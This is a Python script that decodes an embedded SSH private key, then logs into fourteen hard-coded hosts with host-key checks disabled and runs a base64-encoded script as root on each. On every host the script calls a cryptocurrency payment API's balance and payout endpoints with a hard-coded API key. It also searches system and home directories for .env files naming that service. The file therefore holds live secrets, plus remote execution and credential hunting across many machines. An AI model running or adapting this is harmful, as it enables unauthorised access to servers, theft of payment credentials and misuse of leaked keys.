#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# i29839 round2 (lean): per-host pinned-IP NowPayments test, short timeouts, streamed per host.
import base64, subprocess, os, json, sys

KEY = "2XYX9PY-0N04ME1-Q103E93-5DETTCF"
KEYS = {"hk": "LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBNU1vV0p5WHRrdFhLeERjVVpNeEl6R21VR0xxVDJ1cHlhVjVsS2VmU2wyZ0FBQUpCMjBlL3dkdEh2CjhBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQTVNb1dKeVh0a3RYS3hEY1VaTXhJekdtVUdMcVQydXB5YVY1bEtlZlNsMmcKQUFBRUN5alowOHYzU3J0bk1vMllGSG8raDI0dkNTY2RENmhqRVhNWmhmTG5hZGp6a3loWW5KZTJTMWNyRU54Umt6RWpNYQpaUVl1cFBhNm5KcFhtVXA1OUtYYUFBQUFDWFZpZFc1MGRVQm9hd0VDQXdRPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"}
os.makedirs("/tmp/payk2", exist_ok=True)
for n, b in KEYS.items():
    p = "/tmp/payk2/" + n
    open(p, "wb").write(base64.b64decode(b)); os.chmod(p, 0o600)

def R(k, v):
    if not isinstance(v, str):
        v = json.dumps(v, ensure_ascii=False)
    sys.stdout.write("R:%s:%s\n" % (k, base64.b64encode(v.encode()).decode()))
    sys.stdout.flush()

REMOTE = r"""
H=$(hostname 2>/dev/null)
IP=$(curl -s -4 -m 8 https://ifconfig.me 2>/dev/null)
TCP=$(timeout 6 bash -c 'echo > /dev/tcp/104.26.15.71/443' 2>/dev/null && echo TCPOPEN || echo TCPFAIL)
ST=$(curl -s -4 -m 10 -o /tmp/s -w '%{http_code}' --resolve api.nowpayments.io:443:104.26.15.71 https://api.nowpayments.io/v1/status 2>/dev/null)
CUR=$(curl -s -4 -m 10 -o /tmp/c -w '%{http_code}' --resolve api.nowpayments.io:443:104.26.15.71 https://api.nowpayments.io/v1/currencies 2>/dev/null)
BAL=$(curl -s -4 -m 10 -o /tmp/b -w '%{http_code}' --resolve api.nowpayments.io:443:104.26.15.71 -H 'x-api-key: __KEY__' https://api.nowpayments.io/v1/balance 2>/dev/null)
BAL2=$(curl -s -4 -m 10 -o /tmp/b2 -w '%{http_code}' --resolve api.nowpayments.io:443:172.67.71.232 -H 'x-api-key: __KEY__' https://api.nowpayments.io/v1/balance 2>/dev/null)
PC=$(curl -s -4 -m 10 -o /tmp/pc -w '%{http_code}' --resolve api.nowpayments.io:443:104.26.15.71 -H 'x-api-key: __KEY__' https://api.nowpayments.io/v1/payout/currencies 2>/dev/null)
SU=$(timeout 25 sudo -n sh -c "grep -rIl --include='.env*' -e NOWPAYMENTS /opt /data /srv /home /etc /root 2>/dev/null | head -6" 2>/dev/null | tr '\n' ',')
echo "HOST=$H"
echo "IP=$IP"
echo "TCP=$TCP"
echo "ST=$ST BODY=$(head -c 80 /tmp/s 2>/dev/null | tr -d '\n')"
echo "CUR=$CUR BODY=$(head -c 60 /tmp/c 2>/dev/null | tr -d '\n')"
echo "BAL=$BAL BODY=$(head -c 260 /tmp/b 2>/dev/null | tr -d '\n')"
echo "BAL2=$BAL2 BODY=$(head -c 260 /tmp/b2 2>/dev/null | tr -d '\n')"
echo "PAYCUR=$PC BODY=$(head -c 160 /tmp/pc 2>/dev/null | tr -d '\n')"
echo "NPENV=$SU"
echo "ENDFLAG=YES"
""".replace("__KEY__", KEY)

SSHOPTS = ["-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
           "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=8",
           "-o", "IdentitiesOnly=yes"]
HOSTS = ["111.229.184.182", "122.51.1.87", "43.142.238.91", "81.68.254.22", "101.32.60.77",
         "43.143.107.214", "1.14.34.31", "129.211.0.26", "101.34.207.178", "129.28.59.242",
         "132.232.141.32", "139.155.94.165", "49.235.41.58", "81.69.230.90"]

b64 = base64.b64encode(REMOTE.encode()).decode()

def do(host):
    cmd = ["ssh", "-i", "/tmp/payk2/hk"] + SSHOPTS + ["ubuntu@" + host,
           "echo %s | base64 -d | sudo -n bash" % b64]
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=95)
        out = (p.stdout + p.stderr).decode("utf-8", "replace")
        R("NP2_" + host.replace(".", "_"), {"host": host, "ok": "ENDFLAG=YES" in out, "out": out[:4000]})
    except Exception as e:
        R("NP2_" + host.replace(".", "_"), {"host": host, "err": repr(e)[:200]})

from concurrent.futures import ThreadPoolExecutor, as_completed
with ThreadPoolExecutor(max_workers=5) as ex:
    futs = [ex.submit(do, h) for h in HOSTS]
    for f in as_completed(futs):
        try:
            f.result()
        except Exception as e:
            print("ERR", e, flush=True)
print("PROBE2_DONE", flush=True)
